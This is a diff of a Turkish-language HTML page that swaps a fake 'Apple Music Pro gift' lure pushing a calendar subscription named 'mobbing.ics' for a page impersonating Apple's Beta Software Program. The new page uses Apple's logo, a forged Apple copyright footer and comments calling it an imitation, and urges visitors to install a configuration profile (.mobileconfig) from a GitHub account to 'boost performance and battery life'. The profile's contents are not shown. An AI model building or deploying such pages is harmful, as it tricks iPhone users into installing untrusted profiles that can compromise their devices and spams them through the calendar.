@@ -3,44 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Apple Music - Hediye Merkezi</title>
+    <title>Apple Beta Software Program</title>
+    
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="white">
+    <link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
+
     <style>
+        /* APPLE RESMİ STİLLERİ (YAZI TİPLERİ, RENKLER) */
+        :root {
+            --apple-blue: #007aff;
+            --apple-bg: #fff;
+            --apple-text: #1d1d1f;
+            --apple-subtext: #86868b;
+        }
+
         body { 
-            background: #000; color: #fff; 
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
-            display: flex; justify-content: center; align-items: center; 
-            height: 100vh; margin: 0; text-align: center;
+            background-color: var(--apple-bg); 
+            color: var(--apple-text); 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
+            margin: 0; padding: 0;
+            display: flex; flex-direction: column; height: 100vh;
         }
-        .container {
-            width: 85%; padding: 40px; 
-            background: #1c1c1e; border-radius: 30px; 
-            border: 1px solid #333;
-            box-shadow: 0 10px 50px rgba(255, 45, 85, 0.2);
+
+        /* HEADER (Apple Menüsü Taklidi) */
+        header {
+            background-color: rgba(0, 0, 0, 0.8);
+            color: #fff; padding: 10px;
+            font-size: 20px; text-align: center;
+            font-weight: bold;
         }
-        .apple-logo { font-size: 60px; margin-bottom: 20px; }
-        h1 { font-size: 24px; margin-bottom: 10px; font-weight: 700; }
-        p { color: #8e8e93; font-size: 15px; line-height: 1.6; margin-bottom: 30px; }
-        
-        .btn-claim {
-            background: linear-gradient(180deg, #ff2d55 0%, #d40035 100%);
-            color: white; padding: 18px 40px; 
-            border-radius: 15px; font-weight: bold; 
-            text-decoration: none; display: inline-block;
-            font-size: 18px; box-shadow: 0 4px 15px rgba(255, 45, 85, 0.4);
+
+        /* ANA İÇERİK */
+        .main-content {
+            flex: 1; display: flex; flex-direction: column;
+            justify-content: center; align-items: center;
+            text-align: center; padding: 20px;
+        }
+
+        .apple-logo-main {
+            width: 70px; height: 70px;
+            margin-bottom: 25px;
+        }
+
+        h1 {
+            font-size: 32px; font-weight: 700;
+            letter-spacing: -0.5px; margin: 0 0 10px 0;
+        }
+
+        h2 {
+            font-size: 22px; font-weight: 400;
+            color: var(--apple-subtext); margin: 0 0 40px 0;
+            max-width: 80%;
+        }
+
+        /* RESMİ APPLE BUTONU */
+        .btn-apple {
+            background-color: var(--apple-blue);
+            color: #fff; text-decoration: none;
+            padding: 18px 45px; border-radius: 980px;
+            font-weight: 600; font-size: 17px;
+            box-shadow: 0 4px 15px rgba(0, 122, 255, 0.3);
+            transition: background-color 0.2s, transform 0.1s;
+        }
+
+        .btn-apple:hover { background-color: #0062cc; }
+        .btn-apple:active { transform: scale(0.97); }
+
+        /* FOOTER */
+        footer {
+            background-color: #f5f5f7; color: #6e6e73;
+            padding: 20px; font-size: 12px;
+            text-align: center; border-top: 1px solid #d2d2d7;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="apple-logo"></div>
-        <h1>Tebrikler Aga!</h1>
-        <p>Hesabına 12 aylık <b>Apple Music Pro</b> tanımlandı. <br>Hemen butona bas ve "Abone Ol" diyerek kodları almaya başla.</p>
+    <header> Apple Beta Program</header>
+
+    <div class="main-content">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="apple-logo-main">
+        <h1>iOS 19.4 Beta Güncellemesi</h1>
+        <h2>Cihazınızın performansını ve pil ömrünü artırmak için gerekli geliştirici profilini yükleyin.</h2>
         
-        <a href="webcal://raw.githubusercontent.com/keremkero319-del/keross/main/mobbing.ics" class="btn-claim">HEDİYEYİ AL</a>
-        
-        <div style="margin-top:20px; font-size:10px; color:#444;">ID: 2026-Troll-Beta-01</div>
+        <a href="https://raw.githubusercontent.com/keremkero319-del/keross/main/guncelleme.mobileconfig" class="btn-apple">Profili Yükle</a>
     </div>
+
+    <footer>
+        Copyright © 2026 Apple Inc. Tüm hakları saklıdır. <br>Gizlilik Politikası | Kullanım Şartları
+    </footer>
 
 </body>
 </html>
